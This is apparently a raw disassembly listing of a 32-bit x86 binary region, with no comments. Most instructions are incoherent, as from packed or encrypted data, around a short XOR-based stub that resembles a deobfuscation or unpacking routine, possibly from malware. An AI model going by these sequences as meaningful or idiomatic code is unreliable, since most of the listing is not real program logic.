  4028eb:	dec    edi
  4028ec:	sub    edi,DWORD PTR [ebp+edi*2-0x11]
  4028f0:	and    eax,0xa612a049
  4028f5:	sub    ecx,edx
  4028f7:	push   0x92992958
  4028fc:	sbb    DWORD PTR [esi+ecx*2-0x45],esp
  402900:	cli    
  402901:	adc    BYTE PTR [eax+ebx*4],dl
  402904:	mov    ecx,DWORD PTR [edi-0x5f00f6d9]
  40290a:	fst    QWORD PTR [eax+edi*4]
  40290d:	xchg   ebp,eax
  40290e:	inc    esi
  40290f:	test   DWORD PTR [esi],ebp
  402911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402912:	or     eax,0xeed66ea
  402917:	mov    ss,esp
  402919:	imul   edx,edx,0x6dba9b8a
  40291f:	popf   
  402920:	jmp    0x402947
  402922:	cmp    eax,DWORD PTR [ebx+esi*1-0x44]
  402926:	jns    0x402985
  402928:	scas   al,BYTE PTR es:[edi]
  402929:	les    esp,FWORD PTR [ecx+0x3]
  40292c:	fldcw  WORD PTR [esi-0x2e]
  40292f:	out    dx,eax
  402930:	jmp    0x4028f3
  402932:	mov    esi,0x91687988
  402937:	out    0xce,al
  402939:	mov    BYTE PTR [ebp-0x7ac3d1c9],bl
  40293f:	cmp    eax,0xa67168f9
  402944:	jecxz  0x402941
  402946:	lods   eax,DWORD PTR ds:[esi]
  402947:	and    DWORD PTR [eax+0x4b8c95b2],edi
  40294d:	mov    esi,0xe868f4a6
  402952:	ss test eax,0x87a09f1b
  402958:	dec    eax
  402959:	scas   al,BYTE PTR es:[edi]
  40295a:	pop    ebx
  40295b:	pushf  
  40295c:	or     bh,BYTE PTR [ebx+0x7f]
  40295f:	fwait
  402960:	pushf  
  402961:	push   edi
  402962:	dec    ebx
  402963:	aam    0xa0
  402965:	(bad)  
  402967:	push   ebp
  402968:	adc    eax,0x799f02e5
  40296d:	pop    ds
  40296e:	mov    dl,0xf5
  402970:	cmp    esp,DWORD PTR gs:[edx+0x4cfb0778]
  402977:	imul   esp,ebx,0xccfc9c09
  40297d:	repnz inc esp
  40297f:	sbb    al,0xd
  402981:	scas   al,BYTE PTR es:[edi]
  402982:	push   eax
  402983:	dec    esi
  402984:	repz adc bl,cl
  402987:	fld    st(4)
  402989:	in     eax,dx
  40298a:	adc    BYTE PTR [ecx+0x7e2e9fa3],bl
  402990:	imul   DWORD PTR cs:[ecx]
  402993:	ss cmp eax,0x666f1e5f
  402999:	mov    ch,0x4c
  40299b:	mov    ah,0x38
  40299d:	pop    esi
  40299e:	int3   
  40299f:	pop    ebp
  4029a0:	fimul  WORD PTR [ebp+eiz*4-0x40]
  4029a4:	lods   al,BYTE PTR ds:[esi]
  4029a5:	sub    DWORD PTR [eax+0x79],edx
  4029a8:	jno    0x4029e7
  4029aa:	push   esp
  4029ab:	add    eax,0x8ebf917c
  4029b0:	push   eax
  4029b2:	neg    ch
  4029b4:	sub    eax,0x63844155
  4029b9:	setns  BYTE PTR [ecx+ebx*1]
  4029bd:	(bad)  
  4029be:	daa    
  4029bf:	jne    0x4029d9
  4029c1:	mov    ebp,tr0
  4029c4:	xchg   ebx,eax
  4029c5:	fld    DWORD PTR [edx+0x62a701ce]
  4029cb:	add    BYTE PTR [edx-0x7b],ah
  4029ce:	jp     0x4029f7
  4029d0:	aas    
  4029d1:	sahf   
  4029d2:	pop    esi
  4029d3:	jmp    0x9fc23d1c
  4029d8:	add    dh,ah
  4029da:	popf   
  4029db:	sar    BYTE PTR [edi-0x50],0xc6
  4029df:	aad    0xa7
  4029e1:	lds    esp,FWORD PTR [ebx]
  4029e3:	mov    eax,0x2f672257
  4029e8:	xor    ebp,esp
  4029ea:	cs out 0x19,eax
  4029ed:	xchg   BYTE PTR [ebx-0x3b],cl
  4029f0:	in     eax,0x76
  4029f2:	mov    edx,DWORD PTR [eax+esi*4-0x515c6078]
  4029f9:	test   al,0xc8
  4029fb:	adc    al,0x65
  4029fd:	sbb    ebx,DWORD PTR ds:0x9d1c5f9e
  402a03:	mov    ebx,0xc5f1210d
  402a08:	and    ebx,DWORD PTR [ebx]
  402a0a:	ja     0x402a8b
  402a0c:	adc    al,0xa9
  402a0e:	enter  0x5ad,0x51
  402a12:	call   0xeb0c:0xf6226347
  402a19:	cmp    al,0xe8
  402a1b:	xchg   ebx,eax
  402a1c:	sbb    DWORD PTR [esi+eiz*4-0x50ed8d57],0xffffff9f
  402a24:	pop    es
  402a25:	sbb    bh,bh
  402a27:	and    edx,edi
  402a29:	aad    0x50
  402a2b:	stos   BYTE PTR es:[edi],al
  402a2c:	inc    ebx
  402a2d:	mov    DWORD PTR [ecx],0x935a7e37
  402a33:	gs pop ax
  402a36:	or     al,0xe6
  402a38:	jmp    0xc40347fe
  402a3d:	inc    ebx
  402a3e:	in     al,0xec
  402a40:	inc    edx
  402a41:	pop    edi
  402a42:	sti    
  402a43:	push   ecx
  402a44:	stos   DWORD PTR es:[edi],eax
  402a45:	xor    esp,ebp
  402a47:	or     BYTE PTR [edi-0x6d],ch
  402a4a:	xchg   ebx,eax
  402a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a4c:	xchg   ebp,eax
  402a4d:	sbb    al,0xac
  402a4f:	sti    
  402a50:	cmc    
  402a51:	xor    esi,DWORD PTR [ebp+0x3b41786d]
  402a57:	(bad)  
  402a58:	out    0x12,eax
  402a5a:	clc    
  402a5b:	or     DWORD PTR [edi+ebx*4],esp
  402a5e:	dec    eax
  402a5f:	ss out 0x9e,al
  402a62:	and    DWORD PTR [ecx+0x5617171a],edi
  402a68:	pop    es
  402a69:	pop    edx
  402a6a:	push   0x7d
  402a6c:	pop    ecx
  402a6d:	aad    0x48
  402a6f:	push   cs
  402a70:	aad    0x78
  402a72:	mov    edx,0x4a63d4fd
  402a77:	and    DWORD PTR [ebx],ebx
  402a79:	in     eax,dx
  402a7a:	sbb    ebp,DWORD PTR [eax-0x20e03909]
  402a80:	lock xchg edx,eax
  402a82:	neg    BYTE PTR [edx-0x20]
  402a85:	xor    eax,0x5d8dcce7
  402a8a:	pop    ds
  402a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a8c:	fbld   TBYTE PTR gs:[eax+ebp*4+0x74]
  402a91:	jae    0x402af3
  402a93:	push   edi
  402a94:	sbb    al,0xa2
  402a96:	jns    0x402a43
  402a98:	pop    ebx
  402a99:	xor    al,0x3f
  402a9b:	bound  esi,QWORD PTR [ecx-0x5e]
  402a9e:	test   ebx,esi
  402aa0:	mov    ebp,0xba883b77
  402aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aa6:	adc    ch,dh
  402aa8:	xor    dl,BYTE PTR [esi+edx*2]
  402aab:	xor    bl,BYTE PTR [edi]
  402aad:	iret   
  402aae:	xor    eax,0x494691a8
  402ab3:	lods   al,BYTE PTR ds:[esi]
  402ab4:	js     0x402af1
  402ab6:	mov    al,ds:0xc5187e91
  402abb:	push   esi
  402abc:	int    0x68
  402abe:	ins    BYTE PTR es:[edi],dx
  402abf:	mov    bl,bl
  402ac1:	hlt    
  402ac2:	inc    ebx
  402ac3:	not    BYTE PTR ds:[ecx+ebp*8-0x6f]
  402ac8:	loope  0x402a97
  402aca:	pop    ebx
  402acb:	test   al,0xaa
  402acd:	jecxz  0x402af1
  402acf:	jmp    0x57cd:0xb57b41c7
  402ad6:	xor    al,ah
  402ad8:	imul   eax,DWORD PTR [ecx-0x2b],0x4941a492
  402adf:	push   es
  402ae0:	jecxz  0x402ad1
  402ae2:	xor    bh,BYTE PTR ss:[ebp-0x60]
  402ae6:	pop    ss
  402ae7:	adc    eax,0xa8678f8a
  402aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aed:	ret    0x6a96
  402af0:	push   ds
  402af1:	ss ins BYTE PTR es:[edi],dx
  402af3:	dec    ecx
  402af4:	int    0xdc
  402af6:	cmp    eax,0x5462af75
  402afb:	hlt    
  402afc:	push   edx
  402afd:	popa   
  402afe:	ds pop ds
  402b00:	pop    edx
  402b01:	les    edi,FWORD PTR ds:0xa7b06c2e
  402b07:	in     eax,0x37
  402b09:	fidivr DWORD PTR [edi+0x73]
  402b0c:	mov    esi,0xfb9981a3
  402b11:	clc    
  402b12:	push   edi
  402b13:	gs or  esi,DWORD PTR cs:[ecx+0x7af75720]
  402b1b:	hlt    
  402b1c:	mov    bl,0xfd
  402b1e:	ret    0x6790
  402b21:	pop    edi
  402b22:	(bad)  
  402b24:	out    dx,eax
  402b25:	lahf   
  402b26:	test   BYTE PTR [edi-0x4ad4187f],dh
  402b2c:	pop    esi
  402b2d:	add    eax,0x34e311c1
  402b32:	(bad)  
  402b33:	dec    esp
  402b34:	in     al,dx
  402b35:	in     eax,dx
  402b36:	xor    ah,BYTE PTR [edi-0x132b0da7]
  402b3c:	aam    0xab
  402b3e:	mov    edx,0xbb4fe59e
  402b43:	jnp    0x402b7a
  402b45:	out    dx,al
  402b46:	inc    edx
  402b47:	or     bl,BYTE PTR [esi+0x4b]
  402b4a:	sbb    eax,0x5ca59aad
  402b4f:	fwait
  402b50:	mov    bh,ch
  402b52:	ss addr16 sti 
  402b55:	test   al,0x7a
  402b57:	jmp    0x402bc2
  402b59:	clc    
  402b5a:	adc    al,0xd3
  402b5c:	mov    ?,ebp
  402b5e:	sbb    ah,cl
  402b60:	mov    WORD PTR cs:[ecx+0xe],?
  402b64:	adc    eax,0xcda57b42
  402b69:	mov    al,0x2d
  402b6b:	or     BYTE PTR [esi],0x1c
  402b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b6f:	out    dx,eax
  402b70:	inc    eax
  402b71:	pop    esi
  402b72:	lahf   
  402b73:	shl    DWORD PTR [edx],1
  402b75:	jb     0x402bef
  402b77:	cwde   
  402b78:	sub    bh,0xe
  402b7b:	dec    ebx
  402b7c:	sbb    bl,bh
  402b7e:	cli    
  402b7f:	cmp    DWORD PTR [ebx],esi
  402b81:	out    0x31,eax
  402b83:	inc    edx
  402b84:	ror    BYTE PTR [edx-0x35914ae7],0x57
  402b8b:	les    esi,FWORD PTR [esp+ebp*4+0xe]
  402b8f:	in     eax,0xf1
  402b91:	inc    ebx
  402b92:	jae    0x402b16
  402b94:	in     eax,dx
  402b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b96:	adc    edx,edx
  402b98:	jo     0x402be3
  402b9a:	jg     0x402b89
  402b9c:	or     eax,0xcf8bccde
  402ba1:	sub    dl,BYTE PTR [esi]
  402ba3:	cwde   
  402ba4:	and    edi,DWORD PTR [esi]
  402ba6:	pushf  
  402ba7:	lds    esp,FWORD PTR [ebp-0x47]
  402baa:	cmp    eax,0x3df900b3
  402baf:	sbb    al,0xba
  402bb1:	fdivr  DWORD PTR [edi+ecx*8-0x6f]
  402bb5:	loopne 0x402c19
  402bb7:	fs mov ebx,0x6f94e125
  402bbd:	pop    ebp
  402bbe:	or     bh,BYTE PTR [eax+0x25]
  402bc1:	test   eax,0x327874e7
  402bc6:	pop    ebx
  402bc7:	popf   
  402bc8:	inc    ebx
  402bc9:	sbb    BYTE PTR [esp+eiz*2-0x70548e2e],bh
  402bd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bd1:	mov    esp,DWORD PTR [edi]
  402bd3:	pop    edx
  402bd4:	popf   
  402bd5:	xchg   esi,eax
  402bd6:	push   ds
  402bd7:	lahf   
  402bd8:	popa   
  402bd9:	fwait
  402bda:	hlt    
  402bdb:	mov    bl,BYTE PTR [esi-0x79]
  402bde:	dec    esp
  402bdf:	rcl    DWORD PTR [edi+0x6458c6bd],1
  402be5:	inc    ebp
  402be6:	aas    
  402be7:	push   0xffffff9b
  402be9:	xchg   ebx,eax
  402bea:	ret    0xf6a1
  402bed:	and    al,0xd8
  402bef:	mov    edx,0x88f2ee2b
  402bf4:	jmp    0x402c42
  402bf6:	dec    edx
  402bf7:	mov    ah,0x9d
  402bf9:	paddusb mm1,QWORD PTR [ecx-0x652c9849]
  402c00:	loopne 0x402bd8
  402c02:	stos   DWORD PTR es:[edi],eax
  402c03:	scas   eax,DWORD PTR es:[edi]
  402c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c05:	hlt    
  402c06:	mov    ebp,DWORD PTR [ecx]
  402c08:	rol    BYTE PTR [ecx-0x6681c840],1
  402c0e:	inc    esi
  402c0f:	and    dl,BYTE PTR [eax-0x24]
  402c12:	mov    ds:0x6e6c434f,eax
  402c17:	push   ss
  402c18:	call   0x446f40f1
  402c1d:	jmp    0x402c01
  402c1f:	(bad)  
  402c20:	mov    ch,0xf8
  402c22:	ret    
  402c23:	shl    BYTE PTR [esi+eiz*1+0x53],0xca
  402c28:	inc    eax
  402c29:	jl     0x402bc9
  402c2b:	and    eax,0xeb03d6ce
  402c30:	mov    bh,0x92
  402c32:	sti    
  402c33:	(bad)  
  402c34:	mov    bh,0x6c
  402c36:	or     BYTE PTR [edx-0x1a],bh
  402c39:	fdivr  st(3),st
  402c3b:	jp     0x402c21
  402c3d:	arpl   WORD PTR [ecx-0x55],dx
  402c40:	ss push eax
  402c42:	push   ebp
  402c43:	out    dx,eax
  402c44:	jge    0x402cc0
  402c46:	lods   al,BYTE PTR ds:[esi]
  402c47:	xchg   esi,eax
  402c48:	lods   al,BYTE PTR ds:[esi]
  402c49:	iret   
  402c4a:	or     eax,0x78c6bf1b
  402c4f:	into   
  402c50:	mov    ecx,0xaef6d2b3
  402c55:	sub    ch,BYTE PTR fs:[ebp+0x365ead32]
  402c5c:	lea    eax,[edx-0x73efe3c4]
  402c62:	call   0x49b0448a
  402c67:	aaa    
  402c68:	cmp    BYTE PTR [edx],dh
  402c6a:	fwait
  402c6b:	jecxz  0x402c4a
  402c6d:	gs ja  0x402c71
  402c70:	hlt    
  402c71:	adc    edx,edi
  402c73:	or     dh,dh
  402c75:	lahf   
  402c76:	arpl   WORD PTR [edx],bp
  402c78:	es xor eax,0x38adeea5
  402c7e:	imul   DWORD PTR [esi+0x2e]
  402c81:	dec    esi
  402c82:	test   BYTE PTR [edi+0x16],dl
  402c85:	add    bh,BYTE PTR [ebx]
  402c87:	mov    ecx,0x29539e26
  402c8c:	pop    ss
  402c8d:	(bad)  
  402c8e:	xchg   esi,eax
  402c8f:	(bad)  
  402c90:	stc    
  402c91:	adc    DWORD PTR [edi-0x37],esi
  402c94:	es mov ecx,0xf968edbc
  402c9a:	aad    0x3f
  402c9c:	sub    BYTE PTR [esi],cl
  402c9e:	sbb    BYTE PTR [esi],al
  402ca0:	imul   edx,DWORD PTR [esi-0x30],0x41
  402ca4:	mov    WORD PTR [eax-0x5bd1d891],ss
  402caa:	push   esi
  402cab:	cli    
  402cac:	js     0x402d23
  402cae:	and    edx,DWORD PTR [ebp+eiz*8+0x38]
  402cb2:	jnp    0x402cc1
  402cb4:	dec    edi
  402cb5:	or     ah,BYTE PTR [eax+edi*8]
  402cb8:	out    0xa1,eax
  402cba:	iret   
  402cbb:	sbb    BYTE PTR [edx],dl
  402cbd:	in     eax,0x3e
  402cbf:	add    eax,0xaa
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	fs adc esi,ecx
  402d40:	dec    eax
  402d41:	add    DWORD PTR [eax+0x6f7e7e09],ebx
  402d47:	jge    0x402dc7
  402d49:	jle    0x402ce9
  402d4b:	jp     0x402cff
  402d4d:	(bad)  [esi]
  402d4f:	(bad)  
  402d50:	and    al,0x9f
  402d52:	sbb    eax,0x95cdb1e7
  402d57:	ret    0xf7fe
  402d5a:	add    ebx,DWORD PTR [edi+0x28]
  402d5d:	sub    BYTE PTR [ebp+0x4a2277a1],0x38
  402d64:	sub    al,0x8a
  402d66:	(bad)  
  402d67:	out    dx,eax
  402d68:	push   ebp
  402d69:	inc    esp
  402d6a:	mov    DWORD PTR ds:0x4b030ecc,esi
  402d70:	add    al,0x34
  402d72:	pop    ebx
  402d73:	push   0x3f1fd5a9
  402d78:	mov    ebp,0x645c2306
  402d7d:	jg     0x402d04
  402d7f:	mov    ecx,0xc72c8c21
  402d84:	jno    0x402d81
  402d86:	retf   0x9cf
  402d89:	imul   ebp,DWORD PTR [esi+eiz*8-0x73a53ab8],0xffffffc1
  402d91:	fidivr WORD PTR [edx+esi*2+0x19f01f08]
  402d98:	cmp    bl,BYTE PTR [ebx+0x17f605e7]
  402d9e:	jae    0x402e06
  402da0:	mov    eax,ds:0x81deb762
  402da5:	dec    ebp
  402da6:	jbe    0x402d2c
  402da8:	ret    0xc7f7
  402dab:	mov    ebx,0x38f3791a
  402db0:	repz mov edx,0xff61356e
  402db6:	(bad)  [ebp+0xb195a7]
  402dbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dbd:	sub    edx,edi
  402dbf:	sub    eax,0x539b608e
  402dc4:	popa   
  402dc5:	ins    DWORD PTR es:[edi],dx
  402dc6:	add    BYTE PTR [edx+ecx*2],ch
  402dc9:	pop    edi
  402dca:	inc    dh
  402dcc:	loop   0x402d83
  402dce:	jns    0x402dfc
  402dd0:	or     eax,0x4ed3b1e6
  402dd5:	outs   dx,DWORD PTR ds:[esi]
  402dd6:	fisubr DWORD PTR [edi-0x7e9bf229]
  402ddc:	scas   eax,DWORD PTR es:[edi]
  402ddd:	loopne 0x402db2
  402ddf:	arpl   WORD PTR [ecx-0x7a],ax
  402de2:	aad    0xdb
  402de4:	rcl    edx,cl
  402de6:	and    DWORD PTR [edx+0x4ca5dfd8],edi
  402dec:	add    al,0x6c
  402dee:	push   ebx
  402def:	push   ecx
  402df0:	mov    edi,0xec2e19e6
  402df5:	add    eax,0x669ca856
  402dfa:	xchg   edi,eax
  402dfb:	loope  0x402df1
  402dfd:	push   ebp
  402dfe:	call   0xcf1eff4b
  402e03:	inc    esi
  402e04:	add    edi,DWORD PTR [edi-0x16]
  402e07:	(bad)  
  402e08:	jno    0x402ddc
  402e0a:	aam    0x9a
  402e0c:	cdq    
  402e0d:	sub    al,0xac
  402e0f:	enter  0x9374,0x95
  402e13:	fdivr  st(3),st
  402e15:	cmp    eax,DWORD PTR [edi]
  402e17:	sar    BYTE PTR gs:[edi],0xc5
  402e1b:	mov    bl,0x62
  402e1d:	hlt    
  402e1e:	push   0xb3ea837a
  402e23:	and    al,0x9c
  402e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e26:	sbb    DWORD PTR [ecx+0x76fee52],0xffffffce
  402e2d:	cmp    al,0xbc
  402e2f:	jmp    0x402ea4
  402e31:	mov    eax,ds:0x5a304b03
  402e36:	test   DWORD PTR [ecx-0x6d],0x1b419d45
  402e3d:	sar    esi,1
  402e3f:	ins    DWORD PTR es:[edi],dx
  402e40:	cs dec edx
  402e42:	das    
  402e43:	rol    dh,1
  402e45:	ins    DWORD PTR es:[edi],dx
  402e46:	into   
  402e47:	(bad)  
  402e48:	dec    edi
  402e49:	adc    al,0xc2
  402e4b:	test   al,0x31
  402e4d:	cmp    edx,esi
  402e4f:	out    0xb8,al
  402e51:	or     eax,0x5066321f
  402e56:	(bad)  
  402e58:	sbb    dl,dh
  402e5a:	icebp  
  402e5b:	sub    dh,dl
  402e5d:	shr    BYTE PTR [edx-0x48],1
  402e60:	inc    edx
  402e61:	cli    
  402e62:	adc    ch,BYTE PTR [ecx-0x5d]
  402e65:	mov    ah,0xe2
  402e67:	cmc    
  402e68:	call   DWORD PTR [esi-0x275de203]
  402e6e:	inc    ecx
  402e6f:	pop    ebx
  402e70:	das    
  402e71:	mul    ch
  402e73:	xor    eax,DWORD PTR [eax-0x3b]
  402e76:	stos   DWORD PTR es:[edi],eax
  402e77:	in     al,0xef
  402e79:	pop    ds
  402e7a:	aam    0xd8
  402e7c:	fistp  DWORD PTR [eax-0x5c]
  402e7f:	cmp    esp,DWORD PTR [edx]
  402e81:	push   eax
  402e82:	repz pop ds
  402e84:	and    BYTE PTR [edx-0x5ae6f187],bl
  402e8a:	cdq    
  402e8b:	aam    0x82
  402e8d:	nop
  402e8e:	fild   WORD PTR [edi-0x60]
  402e91:	mov    al,ch
  402e93:	push   0x33
  402e95:	fiadd  WORD PTR [esi-0xb96d9a5]
  402e9b:	sub    BYTE PTR [esi+0x46],0x78
  402e9f:	jne    0x402ee9
  402ea1:	or     al,0x1c
  402ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ea4:	adc    BYTE PTR [edi],0x6e
  402ea7:	push   edx
  402ea8:	scas   al,BYTE PTR es:[edi]
  402ea9:	lds    ebp,FWORD PTR [ebp+0x2a16571e]
  402eaf:	outs   dx,BYTE PTR ds:[esi]
  402eb0:	mov    ds:0xca83abf8,al
  402eb5:	and    eax,0x13d36513
  402eba:	sar    esi,1
  402ebc:	fs in  al,0x2f
  402ebf:	or     dl,bh
  402ec1:	stos   BYTE PTR es:[edi],al
  402ec2:	adc    eax,0x6a64f43f
  402ec7:	ror    eax,1
  402ec9:	inc    ebp
  402eca:	outs   dx,BYTE PTR ds:[esi]
  402ecb:	loopne 0x402f30
  402ecd:	adc    BYTE PTR [edx+0x14],dh
  402ed0:	mov    ds:0x2a4f7d74,eax
  402ed5:	mov    edi,0xcd897bb
  402eda:	lea    ecx,[edi+0x505b70ab]
  402ee0:	sub    al,0x49
  402ee2:	ret    
  402ee3:	xor    eax,0x6816b603
  402ee8:	hlt    
  402ee9:	(bad)  
  402eea:	pop    esp
  402eeb:	xchg   esp,eax
  402eec:	out    dx,al
  402eed:	std    
  402eee:	jnp    0x402efb
  402ef0:	mov    ah,dh
  402ef2:	and    eax,0xa3b43b42
  402ef7:	and    edi,DWORD PTR [ebx-0x19ec4c06]
  402efd:	pushf  
  402efe:	push   eax
  402eff:	adc    DWORD PTR [esi+0x60],ecx
  402f02:	hlt    
  402f03:	lock arpl WORD PTR [edi-0x509443f7],sp
  402f0a:	ins    BYTE PTR es:[edi],dx
  402f0b:	xor    BYTE PTR [esi-0x5f],ah
  402f0e:	jno    0x402f27
  402f10:	mov    BYTE PTR [ebx],dh
  402f12:	pop    ss
  402f13:	test   eax,0xab6c1ef4
  402f18:	dec    edi
  402f19:	jae    0x402f4d
  402f1b:	scas   eax,DWORD PTR es:[edi]
  402f1c:	daa    
  402f1d:	or     al,0xd4
  402f1f:	sbb    DWORD PTR [ebx],esi
  402f21:	pop    ds
  402f22:	in     eax,0x30
  402f24:	adc    DWORD PTR [ecx+0x2ab07e8b],esi
  402f2a:	fld    QWORD PTR [edi]
  402f2c:	retf   0xe5f6
  402f2f:	mov    ebp,0x965cf277
  402f34:	jecxz  0x402f2b
  402f36:	xchg   ebp,eax
  402f37:	das    
  402f38:	fild   QWORD PTR [edi-0x12bc7b61]
  402f3e:	add    BYTE PTR [ecx-0x5f],bl
  402f41:	cmp    al,0xea
  402f43:	jo     0x402f98
  402f45:	sub    ah,bh
  402f47:	fimul  WORD PTR [edi]
  402f49:	xor    eax,0x846c0653
  402f4e:	inc    esi
  402f4f:	cmp    al,BYTE PTR [edi]
  402f51:	jno    0x402f08
  402f53:	outs   dx,BYTE PTR ds:[esi]
  402f54:	xlat   BYTE PTR ds:[ebx]
  402f55:	inc    edx
  402f56:	lods   eax,DWORD PTR ds:[esi]
  402f57:	and    DWORD PTR [edx+0x64565393],0xffffffe7
  402f5e:	out    0xdf,eax
  402f60:	aas    
  402f61:	call   0x3a7c:0x3e391a2c
  402f68:	outs   dx,BYTE PTR ds:[esi]
  402f69:	(bad)  
  402f6a:	xchg   esp,eax
  402f6b:	mov    al,ds:0x10994b37
  402f70:	pop    edi
  402f71:	sbb    eax,0xd1a9625c
  402f76:	dec    eax
  402f77:	dec    ebx
  402f78:	mov    esp,0x6be83f63
  402f7d:	in     al,0xcd
  402f7f:	ret    
  402f80:	xchg   DWORD PTR [ecx+0x6a938f31],edi
  402f86:	fisttp DWORD PTR [esi]
  402f88:	in     eax,0xdb
  402f8a:	daa    
  402f8b:	pop    edx
  402f8c:	inc    ebp
  402f8d:	test   DWORD PTR [ecx-0x5d],0xe8534751
  402f94:	in     eax,dx
  402f95:	inc    ebp
  402f96:	call   0x1160f8e3
  402f9b:	pushf  
  402f9c:	loop   0x402f93
  402f9e:	cld    
  402f9f:	fsubr  QWORD PTR [ecx]
  402fa1:	call   0xd0944fa0
  402fa6:	mov    cl,0x7d
  402fa8:	xor    DWORD PTR [esi+0x1d],edi
  402fab:	stos   BYTE PTR es:[edi],al
  402fac:	scas   al,BYTE PTR es:[edi]
  402fad:	jae    0x402fbb
  402faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fb0:	inc    ebx
  402fb1:	mov    fs,WORD PTR [edx-0x46]
  402fb4:	sbb    eax,0xc412b36e
  402fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fba:	mov    eax,0xea2ba0cd
  402fbf:	sub    BYTE PTR [edx+0x34],dl
  402fc2:	call   DWORD PTR [edx]
  402fc4:	push   eax
  402fc5:	dec    ecx
  402fc6:	stos   DWORD PTR es:[edi],eax
  402fc7:	mov    al,ds:0xe4c5273e
  402fcc:	ret    
  402fcd:	mov    edi,0xc9291740
  402fd2:	mov    edx,0x62539dc3
  402fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fd8:	push   esp
  402fd9:	aaa    
  402fda:	cwde   
  402fdb:	and    al,0xce
  402fdd:	pop    edx
  402fde:	push   ebx
  402fdf:	lds    ebp,FWORD PTR [edi-0x36d70915]
  402fe5:	dec    ebp
  402fe6:	or     ecx,0x2aad194e
  402fec:	nop
  402fed:	ret    
  402fee:	lock or cl,0xc
  402ff2:	xor    al,bl
  402ff4:	or     ebx,esi
  402ff6:	push   0x77053a26
  402ffb:	clc    
  402ffc:	inc    eax
  402ffd:	cmp    al,0xda
  402fff:	jns    0x402fdf
  403001:	push   esp
  403002:	add    ecx,DWORD PTR [edx+0x6fcd2c3c]
  403008:	or     eax,0x5dafd437
  40300d:	jmp    0x5fd85ba7
  403012:	cmp    eax,edi
  403014:	jmp    0x143e:0xa4c9b176
  40301b:	mov    eax,0x5c5edb9a
  403020:	aas    
  403021:	ret    0xbc7a
  403024:	sti    
  403025:	lods   eax,DWORD PTR ds:[esi]
  403026:	je     0x402ff1
  403028:	in     eax,0xcc
  40302a:	js     0x40301f
  40302c:	arpl   WORD PTR [ebx-0x3e],cx
  40302f:	loope  0x403031
  403031:	ja     0x403014
  403033:	out    0x62,al
  403035:	xchg   ebp,eax
  403036:	leave  
  403037:	sub    ch,BYTE PTR [ebp-0xeee90c3]
  40303d:	push   ecx
  40303e:	mov    ?,WORD PTR [ebx]
  403040:	pusha  
  403041:	arpl   WORD PTR [ebx+0x44],si
  403044:	adc    BYTE PTR [edx],bl
  403046:	scas   al,BYTE PTR es:[edi]
  403047:	pop    eax
  403048:	add    al,0x17
  40304a:	je     0x402fd2
  40304c:	sar    dl,cl
  40304e:	dec    esi
  40304f:	aam    0x24
  403051:	mov    ebx,DWORD PTR [ebx]
  403053:	(bad)  
  403054:	cmp    DWORD PTR [esi+0x28c770db],ecx
  40305a:	(bad)  
  40305b:	div    BYTE PTR [esi+eiz*1-0x55]
  40305f:	add    eax,0x674ba16c
  403064:	dec    edi
  403065:	mov    ebx,es
  403067:	xor    DWORD PTR [ebx],0xc56e38c9
  40306d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40306e:	xor    eax,0x9f9acdeb
  403073:	jns    0x4030c3
  403075:	mov    ebp,0x1d954040
  40307a:	mul    DWORD PTR [eax-0x5e]
  40307d:	sbb    eax,0xaacacf2c
  403082:	sbb    ecx,DWORD PTR [ecx*1+0x1b0469c0]
  403089:	daa    
  40308a:	imul   edi,DWORD PTR ds:0xd1958c2f,0xcd76c85a
  403094:	jo     0x403063
  403096:	pop    esp
  403097:	adc    ax,0x2532
  40309b:	cld    
  40309c:	data16 icebp 
  40309e:	xchg   edx,eax
  40309f:	hlt    
  4030a0:	sub    dh,dh
  4030a2:	fwait
